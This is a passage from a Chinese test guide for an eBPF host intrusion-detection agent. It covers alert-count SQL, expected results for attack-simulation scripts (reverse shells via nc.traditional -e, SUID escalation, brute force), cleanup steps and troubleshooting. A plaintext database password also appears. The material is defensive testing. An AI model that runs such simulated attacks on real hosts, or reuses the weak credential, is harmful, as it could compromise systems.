SELECT '=== Alert Summary ===' AS section;
SELECT
    (SELECT COUNT(*) FROM alert_dangerous_command WHERE agent_id = '123456') AS dangerous_cmd,
    (SELECT COUNT(*) FROM alert_privilege_escalation WHERE agent_id = '123456') AS privesc,
    (SELECT COUNT(*) FROM alert_reverse_shell WHERE agent_id = '123456') AS reverse_shell,
    (SELECT COUNT(*) FROM alert_malicious_request WHERE agent_id = '123456') AS malicious_request,
    (SELECT COUNT(*) FROM alert_file_integrity WHERE agent_id = '123456') AS file_integrity,
    (SELECT COUNT(*) FROM alert_brute_force WHERE agent_id = '123456') AS brute_force,
    (SELECT COUNT(*) FROM alert_abnormal_login WHERE agent_id = '123456') AS abnormal_login,
    (SELECT COUNT(*) FROM alert_network_attack WHERE agent_id = '123456') AS network_attack,
    (SELECT COUNT(*) FROM alert_malware_scan WHERE agent_id = '123456') AS malware_scan;
```

### 预期结果

| 告警表 | 预期记录数 | 对应脚本 | 备注 |
|--------|-----------|---------|------|
| alert_dangerous_command | >= 4 | test-dangerous-commands.sh | 系统 modprobe 可能产生额外记录 |
| alert_privilege_escalation | >= 1 | test-privilege-escalation.sh | 需 gcc + 非 root 用户；postfix 可能产生额外记录 |
| alert_reverse_shell | >= 3 | test-reverse-shell.sh | 需 nc.traditional + python3；sshd 可能产生额外记录 |
| alert_malicious_request | >= 1 | test-malicious-requests.sh | DNS 类需 dig，预期 3 条；IOC002 端口类不一定触发 |
| alert_file_integrity | >= 2 | test-file-integrity.sh | 仅 create + delete 触发；modify 和 /etc/hosts 当前不产生告警 |
| alert_brute_force | >= 1 | test-ssh-bruteforce.sh / test-ftp-bruteforce.sh | 需移除白名单，检测有 1-2 分钟延迟 |
| alert_abnormal_login | >= 1 | test-ssh-anomaly-login.sh | 需配置 anomaly_rules |
| alert_network_attack | >= 11 | test-nids.sh | 需 Nginx；重复攻击可能产生约 14 条记录 |
| alert_malware_scan | >= 1 | test-scanner.sh | 需 ClamAV；建议修改扫描路径为小目录 |

---

## 十、测试后清理

### 10.1 停止服务

```bash
# Terminal B：停止 Agent（Ctrl+C）
# Terminal A：停止 server（Ctrl+C）
```

### 10.2 清理测试产物

```bash
# SUID 提权测试产物（脚本通常会自动清理，以防万一）
rm -f /tmp/suid_wrapper /tmp/suid_wrapper.c /tmp/suid_test_id

# 文件完整性测试产物
rm -f /etc/cron.d/ebpf_test_cron

# EICAR 测试文件
sudo bash scripts/trigger_intrusion_alert/test-scanner.sh cleanup
# 或手动清理
rm -rf /root/scanner_test

# 反弹 Shell 残留进程
killall nc 2>/dev/null
killall nc.traditional 2>/dev/null

# 高危命令测试产物
rm -f /tmp/dc003_test
```

### 10.3 清理数据库（可选）

```bash
# 全量清空
bash scripts/clean-test-db.sh

# 或仅清理告警表
PGPASSWORD=root psql -h 127.0.0.1 -p 5432 -U postgres -d soc -c "
TRUNCATE TABLE alert_brute_force, alert_dangerous_command, alert_privilege_escalation,
    alert_reverse_shell, alert_abnormal_login, alert_malicious_request,
    alert_malware_scan, alert_network_attack, alert_file_integrity CASCADE;
"
```

### 10.4 恢复配置

```bash
# 恢复 server 数据库配置
cp /opt/cloudsec/server/conf/server.yaml.bak /opt/cloudsec/server/conf/server.yaml

# 如果修改过白名单，需恢复原始白名单配置（已包含在 .bak 中）

# agent-local.yaml 可保留供后续测试使用，无需删除
```

---

## 十一、常见问题

### Agent 连接失败

```
transport: Error while dialing: dial tcp 127.0.0.1:50051: connect: connection refused
```

**排查**：
1. 确认 server 已启动且监听 50051 端口：`ss -tlnp | grep 50051`
2. 确认 agent-local.yaml 中 `server` 地址正确
3. 检查防火墙是否放行端口

### 白名单未移除导致 SSH/FTP 暴力破解不触发

**现象**：脚本执行成功但数据库中 `alert_brute_force` 无记录。

**排查**：
1. 检查 server.yaml 中对应 task 的 `whitelist` 是否仍包含 `127.0.0.1`
2. 修改白名单后需重启 server 和 Agent 使配置生效
3. Standalone 模式下检查本地 detector 配置文件

### Detector 检测延迟

**现象**：脚本执行完毕后立即查询数据库无记录。

**原因**：Detector 插件按周期扫描日志（默认约 1 分钟），不是实时检测。

**处理**：等待 1-2 分钟后重新查询。

### DNS 不通导致恶意请求测试部分跳过

**现象**：test-malicious-requests.sh 输出 "跳过 — 未安装 dig"。

**处理**：安装 dnsutils：`sudo apt install dnsutils`。如果 dig 已安装但 DNS 解析超时（如 `systemd-resolved` 异常），DNS 类测试无法进行，但 IOC002（端口匹配）不受影响。

### Scanner 文件需在 Agent 启动前创建

**现象**：Agent 已运行，执行 `test-scanner.sh prepare` 后数据库中 `alert_malware_scan` 无记录。

**原因**：server 在 Agent 连接时自动下发扫描任务，扫描时测试文件尚不存在。

**处理**：
1. 先执行 `test-scanner.sh prepare` 创建测试文件
2. 重启 Agent（停止后重新启动）
3. Agent 重连后 server 会重新下发扫描任务

### NIDS 日志文件不存在

**现象**：test-nids.sh 报错 `NIDS 日志文件不存在`。

**排查**：
1. 确认 Agent 已启动且 nids 插件已加载（Terminal B 日志中搜索 `plugin has been loaded {"plugin": "nids"}`）
2. 确认日志路径 `/opt/cloudsec/agent/logs/plugins/nids/nids.log` 是否正确
3. 如果使用 build 目录运行，日志路径可能不同

### 反弹 Shell 脚本缺少 nc.traditional

**现象**：test-reverse-shell.sh 报错 `未找到 nc.traditional`。

**处理**：
```bash
sudo apt install netcat-traditional
```

> Ubuntu 默认安装的 `netcat-openbsd` 不支持 `-e` 参数，反弹 Shell 的 RS001 测试需要 `netcat-traditional` 提供的 `nc.traditional`。

### 告警表中出现大量系统噪声记录

**现象**：数据库中告警记录数远超预期，包含大量非脚本触发的记录。

**常见噪声来源**：

| 告警表 | 噪声来源 | 过滤方式 |
|--------|---------|---------|
| alert_dangerous_command | 系统 modprobe 调用 | `command NOT LIKE '%modprobe%'` |
| alert_privilege_escalation | postfix/local 邮件投递 | `process_path LIKE '%suid_wrapper%'` |
| alert_reverse_shell | sshd fork（暴力破解测试附带） | `target_port IN (9001, 9002, 9003)` |

**处理**：这些是正常的检测行为（eBPF 捕获了所有匹配规则的系统事件），不影响测试结论。验证时通过 SQL WHERE 条件过滤即可。

### test-dangerous-commands.sh 在第 4 步崩溃

**现象**：脚本执行到 `insmod /tmp/nonexistent.ko` 时退出（exit code 1），后续步骤跳过。

**原因**：脚本使用 `set -e`，`insmod` 命令对不存在的文件返回非零退出码，`; true` 无法阻止 `set -e` 退出（需改为 `|| true`）。

**影响**：eBPF 在 exec 阶段已捕获事件，`insmod` 的告警记录仍会写入数据库。脚本后续步骤被跳过但不影响数据库验证结果。

### Scanner 扫描无结果

**现象**：Agent 启动后等待较长时间，`alert_malware_scan` 表仍无记录。

**原因**：默认扫描路径为 `/root/scanner_test` 专用小目录，正常情况下扫描很快。如仍无结果，请检查 ClamAV 是否正确安装、病毒库是否已更新（`sudo freshclam`）。

**处理**：确认 server.yaml 中 scanner task 的扫描路径为 `/root/scanner_test`（参见 §8.1 说明），确认 EICAR 文件已创建在该目录下，重启 server 和 Agent。
